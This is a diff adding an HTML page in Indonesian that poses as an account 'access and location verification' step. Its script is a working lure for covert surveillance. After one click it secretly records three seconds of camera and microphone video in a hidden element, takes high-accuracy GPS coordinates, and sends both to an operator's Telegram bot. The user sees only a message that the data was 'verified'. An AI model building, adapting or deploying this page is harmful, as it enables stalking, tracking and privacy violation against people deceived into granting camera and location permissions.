@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verifikasi Akses & Lokasi</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      background-color: #f4f6f8;
+      margin: 0;
+    }
+    .container {
+      background: #ffffff;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+      text-align: center;
+      max-width: 400px;
+      width: 90%;
+    }
+    button {
+      background-color: #0088cc;
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      font-size: 16px;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-top: 15px;
+    }
+    button:hover {
+      background-color: #006699;
+    }
+    #status {
+      margin-top: 15px;
+      font-size: 14px;
+      color: #555;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <h2>Mulai Verifikasi</h2>
+  <p>Klik tombol di bawah untuk memberikan izin lokasi dan rekaman singkat demi verifikasi akun.</p>
+  <button id="startBtn">Izinkan & Ambil Data</button>
+  <p id="status"></p>
+</div>
+
+<!-- Element video tersembunyi untuk proses perekaman -->
+<video id="videoPreview" autoplay muted style="display:none;"></video>
+
+<script>
+  const BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN";
+  const CHAT_ID = "YOUR_TELEGRAM_CHAT_ID";
+
+  const startBtn = document.getElementById('startBtn');
+  const statusTxt = document.getElementById('status');
+  const video = document.getElementById('videoPreview');
+
+  startBtn.addEventListener('click', async () => {
+    statusTxt.innerText = "Meminta izin browser...";
+
+    try {
+      // 1. Minta Izin Kamera & Mikrofon
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+      video.srcObject = stream;
+      statusTxt.innerText = "Izin kamera diberikan. Merekam 3 detik...";
+
+      // Rekam video selama 3 detik
+      const videoBlob = await recordMedia(stream, 3000);
+
+      // 2. Minta Izin Lokasi (GPS)
+      statusTxt.innerText = "Meminta akses lokasi...";
+      const position = await getCoordinates();
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+
+      // Stop semua track kamera setelah selesai rekam
+      stream.getTracks().forEach(track => track.stop());
+
+      statusTxt.innerText = "Mengirim data ke bot Telegram...";
+
+      // 3. Kirim Lokasi ke Telegram Bot
+      await sendTelegramLocation(latitude, longitude);
+
+      // 4. Kirim Rekaman Video ke Telegram Bot
+      await sendTelegramVideo(videoBlob);
+
+      statusTxt.innerText = "Proses selesai! Data berhasil diverifikasi.";
+
+    } catch (err) {
+      console.error(err);
+      statusTxt.innerText = "Gagal: " + err.message + ". Pastikan Anda menyetujui pop-up izin.";
+    }
+  });
+
+  // Fungsi merekam media dari kamera
+  function recordMedia(stream, duration) {
+    return new Promise((resolve) => {
+      const mediaRecorder = new MediaRecorder(stream);
+      const chunks = [];
+
+      mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+      mediaRecorder.onstop = () => {
+        const blob = new Blob(chunks, { type: 'video/webm' });
+        resolve(blob);
+      };
+
+      mediaRecorder.start();
+      setTimeout(() => mediaRecorder.stop(), duration);
+    });
+  }
+
+  // Fungsi mendapatkan koordinat GPS
+  function getCoordinates() {
+    return new Promise((resolve, reject) => {
+      navigator.geolocation.getCurrentPosition(resolve, reject, {
+        enableHighAccuracy: true,
+        timeout: 10000,
+        maximumAge: 0
+      });
+    });
+  }
+
+  // Fungsi kirim lokasi via Telegram Bot API
+  async function sendTelegramLocation(lat, lon) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
+    await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        latitude: lat,
+        longitude: lon
+      })
+    });
+  }
+
+  // Fungsi kirim file video rekaman via Telegram Bot API
+  async function sendTelegramVideo(blob) {
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('video', blob, 'recording.webm');
+    formData.append('caption', '🎥 Hasil rekaman kamera pengguna');
+
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
+    await fetch(url, {
+      method: 'POST',
+      body: formData
+    });
+  }
+</script>
+
+</body>
+</html>
